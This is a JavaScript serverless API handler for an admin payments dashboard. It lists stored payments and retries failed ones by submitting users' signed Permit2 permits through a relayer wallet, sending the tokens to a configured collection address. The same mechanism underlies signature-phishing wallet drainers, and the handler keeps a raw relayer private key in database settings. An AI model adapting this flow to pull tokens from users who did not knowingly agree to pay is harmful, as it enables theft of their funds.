import { ethers } from 'ethers';
import { getSupabase, getSettings, cors, requireAdmin } from '../lib/supabase.js';

const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
const PERMIT2_ABI = [
  `function permitTransferFrom(
    ((address token, uint256 amount) permitted, address spender, uint256 nonce, uint256 deadline) permit,
    (address to, uint256 requestedAmount) transferDetails,
    address owner,
    bytes signature
  )`
];

async function executePermit(settings, payment) {
  const provider = new ethers.JsonRpcProvider(settings.rpc_url);
  const relayer = new ethers.Wallet(settings.relayer_private_key, provider);
  const permit2 = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, relayer);

  const permit = payment.permit;
  const transferDetails = {
    to: settings.collection_address,
    requestedAmount: payment.amount
  };

  const tx = await permit2.permitTransferFrom(
    {
      permitted: {
        token: permit.permitted.token,
        amount: permit.permitted.amount
      },
      spender: permit.spender,
      nonce: permit.nonce,
      deadline: permit.deadline
    },
    transferDetails,
    payment.owner_address,
    payment.signature
  );

  const receipt = await tx.wait();
  return receipt.hash;
}

export default async function handler(req, res) {
  cors(res);
  if (req.method === 'OPTIONS') return res.status(200).end();

  try {
    const supabase = getSupabase();
    const settings = await getSettings(supabase);
    requireAdmin(req, settings);

    // GET – list payments
    if (req.method === 'GET') {
      const status = req.query?.status;
      let q = supabase.from('payments').select('*').order('created_at', { ascending: false }).limit(100);
      if (status) q = q.eq('status', status);

      const { data, error } = await q;
      if (error) throw error;
      return res.status(200).json({ payments: data || [] });
    }

    // POST – retry a failed payment
    if (req.method === 'POST') {
      const { id, action } = req.body || {};
      if (action !== 'retry' || !id) {
        return res.status(400).json({ error: 'Expected { id, action: "retry" }' });
      }

      if (!settings.rpc_url || !settings.relayer_private_key || !settings.collection_address) {
        return res.status(400).json({ error: 'Configure RPC, private key, and collection address in Settings first' });
      }

      const { data: payment, error: fetchErr } = await supabase
        .from('payments')
        .select('*')
        .eq('id', id)
        .single();

      if (fetchErr || !payment) {
        return res.status(404).json({ error: 'Payment not found' });
      }

      if (payment.status === 'success') {
        return res.status(400).json({ error: 'Payment already succeeded' });
      }

      // Check deadline
      const deadline = BigInt(payment.permit?.deadline || 0);
      const now = BigInt(Math.floor(Date.now() / 1000));
      if (deadline > 0n && now > deadline) {
        await supabase
          .from('payments')
          .update({
            status: 'failed',
            error_message: 'Permit deadline expired',
            updated_at: new Date().toISOString()
          })
          .eq('id', id);
        return res.status(400).json({ error: 'Permit deadline expired – user must sign again' });
      }

      try {
        const txHash = await executePermit(settings, payment);
        await supabase
          .from('payments')
          .update({
            status: 'success',
            tx_hash: txHash,
            error_message: null,
            retry_count: (payment.retry_count || 0) + 1,
            updated_at: new Date().toISOString()
          })
          .eq('id', id);

        return res.status(200).json({ success: true, txHash });
      } catch (execErr) {
        await supabase
          .from('payments')
          .update({
            status: 'failed',
            error_message: execErr.shortMessage || execErr.message,
            retry_count: (payment.retry_count || 0) + 1,
            updated_at: new Date().toISOString()
          })
          .eq('id', id);

        return res.status(500).json({
          error: execErr.shortMessage || execErr.message
        });
      }
    }

    return res.status(405).json({ error: 'Method not allowed' });
  } catch (err) {
    const status = err.status || 500;
    return res.status(status).json({ error: err.message });
  }
}
